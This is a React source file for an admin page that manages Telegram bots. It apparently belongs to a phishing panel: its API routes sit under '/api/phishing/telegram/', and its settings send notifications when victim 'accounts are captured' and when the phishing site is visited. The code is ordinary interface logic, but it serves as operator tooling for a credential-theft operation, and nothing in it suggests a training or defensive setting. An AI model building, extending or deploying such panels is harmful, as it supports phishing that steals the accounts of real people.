import { useState, useEffect, useCallback } from 'react';
import { Page } from "components/shared/Page";
import { Card, Button, Input, Switch, Modal, Badge } from "components/ui";
import { useThemeContext } from "app/contexts/theme/context";
import { 
  ChatBubbleLeftRightIcon,
  CheckCircleIcon,
  PlusIcon,
  TrashIcon,
  PencilIcon,
  BoltIcon
} from '@heroicons/react/24/outline';
import { toast } from 'sonner';

export default function TelegramBots() {
  const { isDark } = useThemeContext();
  const [bots, setBots] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [editingBot, setEditingBot] = useState(null);
  const [currentPage, setCurrentPage] = useState(1);
  const botsPerPage = 10;
  
  const [formData, setFormData] = useState({
    bot_name: '',
    bot_token: '',
    chat_id: '',
    notify_new_accounts: true,
    notify_website_views: false,
    notify_errors: true
  });

  // Load bots
  const loadBots = useCallback(async () => {
    try {
      setIsLoading(true);
      const token = localStorage.getItem('authToken');
      
      const response = await fetch('/api/phishing/telegram/bots', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setBots(data.data || []);
      }
    } catch (error) {
      console.error('Error loading bots:', error);
      toast.error('Failed to load bots');
    } finally {
      setIsLoading(false);
    }
  }, []);

  useEffect(() => {
    loadBots();
  }, [loadBots]);

  // Open modal for add/edit
  const openModal = (bot = null) => {
    if (bot) {
      setEditingBot(bot);
      setFormData({
        bot_name: bot.bot_name,
        bot_token: bot.bot_token,
        chat_id: bot.chat_id,
        notify_new_accounts: bot.notify_new_accounts,
        notify_website_views: bot.notify_website_views,
        notify_errors: bot.notify_errors
      });
    } else {
      setEditingBot(null);
      setFormData({
        bot_name: '',
        bot_token: '',
        chat_id: '',
        notify_new_accounts: true,
        notify_website_views: false,
        notify_errors: true
      });
    }
    setIsModalOpen(true);
  };

  // Save bot
  const handleSave = async () => {
    if (!formData.bot_name || !formData.bot_token || !formData.chat_id) {
      toast.error('Please fill all required fields');
      return;
    }

    // Show loading toast for verification
    const loadingToast = editingBot 
      ? toast.loading('Updating bot...')
      : toast.loading('Verifying bot... This may take a few seconds');

    try {
      const token = localStorage.getItem('authToken');
      const url = editingBot 
        ? `/api/phishing/telegram/bots/${editingBot.id}`
        : '/api/phishing/telegram/bots';
      
      const response = await fetch(url, {
        method: editingBot ? 'PUT' : 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
      });

      const data = await response.json();
      
      // Dismiss loading toast
      toast.dismiss(loadingToast);

      if (response.ok) {
        toast.success(data.message || (editingBot ? 'Bot updated successfully' : 'Bot added successfully'));
        setIsModalOpen(false);
        loadBots();
      } else {
        toast.error(data.message || 'Failed to save bot');
      }
    } catch (error) {
      toast.dismiss(loadingToast);
      console.error('Error saving bot:', error);
      toast.error('Failed to save bot');
    }
  };

  // Toggle bot enabled status
  const toggleBot = async (botId, currentStatus) => {
    try {
      const token = localStorage.getItem('authToken');
      
      const response = await fetch(`/api/phishing/telegram/bots/${botId}/toggle`, {
        method: 'PATCH',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ is_enabled: !currentStatus })
      });

      if (response.ok) {
        toast.success(currentStatus ? 'Bot disabled' : 'Bot enabled');
        loadBots();
      } else {
        toast.error('Failed to toggle bot');
      }
    } catch (error) {
      console.error('Error toggling bot:', error);
      toast.error('Failed to toggle bot');
    }
  };

  // Verify and setup webhook
  const verifyBot = async (botId) => {
    try {
      const token = localStorage.getItem('authToken');
      
      const response = await fetch(`/api/phishing/telegram/bots/${botId}/verify`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        toast.success(data.message || 'Bot verified and webhook setup successfully!');
        loadBots();
      } else {
        const errorData = await response.json();
        toast.error(errorData.message || 'Verification failed');
      }
    } catch (error) {
      console.error('Error verifying bot:', error);
      toast.error('Verification failed');
    }
  };

  // Delete bot
  const deleteBot = async (botId, botName) => {
    if (!confirm(`Are you sure you want to delete bot "${botName}"?`)) {
      return;
    }

    try {
      const token = localStorage.getItem('authToken');
      
      const response = await fetch(`/api/phishing/telegram/bots/${botId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        toast.success('Bot deleted successfully');
        loadBots();
      } else {
        toast.error('Failed to delete bot');
      }
    } catch (error) {
      console.error('Error deleting bot:', error);
      toast.error('Failed to delete bot');
    }
  };

  // Pagination
  const indexOfLastBot = currentPage * botsPerPage;
  const indexOfFirstBot = indexOfLastBot - botsPerPage;
  const currentBots = bots.slice(indexOfFirstBot, indexOfLastBot);
  const totalPages = Math.ceil(bots.length / botsPerPage);

  return (
    <Page title="Telegram Bots Management">
      <div className="transition-content w-full px-(--margin-x) pt-5 lg:pt-6">
        <div className="min-w-0">
          {/* Header */}
          <div className="mb-8">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className={`p-3 rounded-xl ${isDark ? 'bg-blue-500/20' : 'bg-blue-100'}`}>
                  <ChatBubbleLeftRightIcon className={`h-6 w-6 ${isDark ? 'text-blue-400' : 'text-blue-600'}`} />
                </div>
                <div>
                  <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
                    Telegram Bots
                  </h1>
                  <p className="mt-2 text-gray-600 dark:text-gray-400">
                    Manage multiple Telegram bots for notifications
                  </p>
                </div>
              </div>
              <Button
                variant="filled"
                color="primary"
                onClick={() => openModal()}
              >
                <PlusIcon className="h-5 w-5 mr-2" />
                Add Bot
              </Button>
            </div>
          </div>

          {/* Bots Table */}
          <Card className={`overflow-hidden ${isDark ? 'bg-gray-800/50 border-gray-700' : 'bg-white border-gray-200'}`}>
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                <thead className={isDark ? 'bg-gray-800' : 'bg-gray-50'}>
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Bot Name
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Username
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Chat ID
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Status
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Notifications
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Messages
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className={`divide-y ${isDark ? 'divide-gray-700 bg-gray-900' : 'divide-gray-200 bg-white'}`}>
                  {isLoading ? (
                    <tr>
                      <td colSpan="7" className="px-6 py-12 text-center">
                        <div className="flex justify-center">
                          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary-500"></div>
                        </div>
                      </td>
                    </tr>
                  ) : currentBots.length === 0 ? (
                    <tr>
                      <td colSpan="7" className="px-6 py-12 text-center">
                        <ChatBubbleLeftRightIcon className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                        <h3 className="text-lg font-medium text-gray-900 dark:text-white mb-2">
                          No bots configured
                        </h3>
                        <p className="text-gray-600 dark:text-gray-400 mb-4">
                          Add your first Telegram bot to start receiving notifications
                        </p>
                        <Button
                          variant="filled"
                          color="primary"
                          onClick={() => openModal()}
                        >
                          <PlusIcon className="h-4 w-4 mr-2" />
                          Add Bot
                        </Button>
                      </td>
                    </tr>
                  ) : (
                    currentBots.map((bot) => (
                      <tr key={bot.id} className={isDark ? 'hover:bg-gray-800' : 'hover:bg-gray-50'}>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="text-sm font-medium text-gray-900 dark:text-white">
                            {bot.bot_name}
                          </div>
                          {bot.last_message_at && (
                            <div className="text-xs text-gray-500">
                              Last used: {new Date(bot.last_message_at).toLocaleString()}
                            </div>
                          )}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          {bot.bot_username ? (
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(`https://t.me/${bot.bot_username}`);
                                toast.success('Bot link copied!');
                              }}
                              className="text-sm text-blue-600 dark:text-blue-400 hover:underline"
                            >
                              @{bot.bot_username}
                            </button>
                          ) : (
                            <span className="text-sm text-gray-500">N/A</span>
                          )}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <code className="text-xs font-mono text-gray-600 dark:text-gray-400">
                            {bot.chat_id}
                          </code>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="flex flex-col gap-1">
                            <Badge 
                              color={bot.is_enabled ? 'success' : 'secondary'}
                              variant="soft"
                            >
                              {bot.is_enabled ? 'Enabled' : 'Disabled'}
                            </Badge>
                            {bot.is_verified ? (
                              <Badge color="success" variant="soft" className="flex items-center gap-1">
                                <CheckCircleIcon className="h-3 w-3" />
                                Verified
                              </Badge>
                            ) : (
                              <Badge color="warning" variant="soft">
                                Not Verified
                              </Badge>
                            )}
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <div className="flex flex-col gap-1 text-xs">
                            {bot.notify_new_accounts && (
                              <span className="text-green-600 dark:text-green-400">✓ New Accounts</span>
                            )}
                            {bot.notify_website_views && (
                              <span className="text-green-600 dark:text-green-400">✓ Website Views</span>
                            )}
                            {bot.notify_errors && (
                              <span className="text-green-600 dark:text-green-400">✓ Errors</span>
                            )}
                          </div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="text-sm text-gray-900 dark:text-white">
                            {bot.messages_sent || 0}
                          </div>
                          {bot.last_error && (
                            <div className="text-xs text-red-500" title={bot.last_error}>
                              Last error: {new Date(bot.last_error_at).toLocaleString()}
                            </div>
                          )}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-right">
                          <div className="flex justify-end gap-2">
                            <Switch
                              checked={bot.is_enabled}
                              onChange={() => toggleBot(bot.id, bot.is_enabled)}
                              size="sm"
                            />
                            {!bot.is_verified && (
                              <Button
                                size="sm"
                                variant="outlined"
                                color="success"
                                onClick={() => verifyBot(bot.id)}
                                title="Verify & Setup Webhook"
                              >
                                <BoltIcon className="h-4 w-4" />
                              </Button>
                            )}
                            <Button
                              size="sm"
                              variant="outlined"
                              onClick={() => openModal(bot)}
                            >
                              <PencilIcon className="h-4 w-4" />
                            </Button>
                            <Button
                              size="sm"
                              variant="outlined"
                              color="error"
                              onClick={() => deleteBot(bot.id, bot.bot_name)}
                            >
                              <TrashIcon className="h-4 w-4" />
                            </Button>
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="px-6 py-4 border-t border-gray-200 dark:border-gray-700">
                <div className="flex items-center justify-between">
                  <div className="text-sm text-gray-700 dark:text-gray-300">
                    Showing {indexOfFirstBot + 1} to {Math.min(indexOfLastBot, bots.length)} of {bots.length} bots
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outlined"
                      onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
                      disabled={currentPage === 1}
                    >
                      Previous
                    </Button>
                    {[...Array(totalPages)].map((_, i) => (
                      <Button
                        key={i}
                        size="sm"
                        variant={currentPage === i + 1 ? 'filled' : 'outlined'}
                        onClick={() => setCurrentPage(i + 1)}
                      >
                        {i + 1}
                      </Button>
                    ))}
                    <Button
                      size="sm"
                      variant="outlined"
                      onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
                      disabled={currentPage === totalPages}
                    >
                      Next
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </Card>
        </div>
      </div>

      {/* Add/Edit Modal */}
      <Modal
        open={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title={editingBot ? 'Edit Bot' : 'Add Telegram Bot'}
      >
        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
              Bot Name *
            </label>
            <Input
              value={formData.bot_name}
              onChange={(e) => setFormData(prev => ({ ...prev, bot_name: e.target.value }))}
              placeholder="My Notification Bot"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
              Bot Token *
            </label>
            <Input
              type="password"
              value={formData.bot_token}
              onChange={(e) => setFormData(prev => ({ ...prev, bot_token: e.target.value }))}
              placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
            />
            <p className="text-xs text-gray-500 mt-1">
              Get from @BotFather on Telegram
            </p>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
              Chat ID *
            </label>
            <Input
              value={formData.chat_id}
              onChange={(e) => setFormData(prev => ({ ...prev, chat_id: e.target.value }))}
              placeholder="123456789 or @channel"
            />
            <p className="text-xs text-gray-500 mt-1">
              Use @userinfobot to get your chat ID
            </p>
          </div>

          <div className="border-t border-gray-200 dark:border-gray-700 pt-4">
            <h4 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">
              Notification Settings
            </h4>
            
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div>
                  <label className="text-sm text-gray-700 dark:text-gray-300">
                    New Accounts
                  </label>
                  <p className="text-xs text-gray-500">
                    Notify when accounts are captured
                  </p>
                </div>
                <Switch
                  checked={formData.notify_new_accounts}
                  onChange={(checked) => setFormData(prev => ({ ...prev, notify_new_accounts: checked }))}
                />
              </div>

              <div className="flex items-center justify-between">
                <div>
                  <label className="text-sm text-gray-700 dark:text-gray-300">
                    Website Views
                  </label>
                  <p className="text-xs text-gray-500">
                    Notify on website visits
                  </p>
                </div>
                <Switch
                  checked={formData.notify_website_views}
                  onChange={(checked) => setFormData(prev => ({ ...prev, notify_website_views: checked }))}
                />
              </div>

              <div className="flex items-center justify-between">
                <div>
                  <label className="text-sm text-gray-700 dark:text-gray-300">
                    Errors
                  </label>
                  <p className="text-xs text-gray-500">
                    Notify on system errors
                  </p>
                </div>
                <Switch
                  checked={formData.notify_errors}
                  onChange={(checked) => setFormData(prev => ({ ...prev, notify_errors: checked }))}
                />
              </div>
            </div>
          </div>

          <div className="flex gap-2 pt-4">
            <Button
              variant="outlined"
              onClick={() => setIsModalOpen(false)}
              className="flex-1"
            >
              Cancel
            </Button>
            <Button
              variant="filled"
              color="primary"
              onClick={handleSave}
              className="flex-1"
              disabled={!formData.bot_name || !formData.bot_token || !formData.chat_id}
            >
              {editingBot ? 'Update Bot' : 'Add Bot'}
            </Button>
          </div>
        </div>
      </Modal>
    </Page>
  );
}